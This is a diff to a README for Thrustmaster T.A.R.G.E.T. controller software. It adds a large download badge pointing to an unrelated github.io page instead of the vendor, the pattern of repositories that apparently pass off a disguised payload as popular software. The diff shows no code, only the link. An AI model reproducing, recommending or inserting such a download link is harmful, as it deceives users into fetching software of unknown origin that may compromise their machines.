@@ -30,6 +30,12 @@ T.A.R.G.E.T. provides a full scripting environment for Thrustmaster flight contr
 
 Whether you're a newcomer or a veteran, Thrustmaster T.A.R.G.E.T. provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Thrustmaster T.A.R.G.E.T.](https://img.shields.io/badge/⬇_DOWNLOAD_Thrustmaster+T.A.R.G.E.T.-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
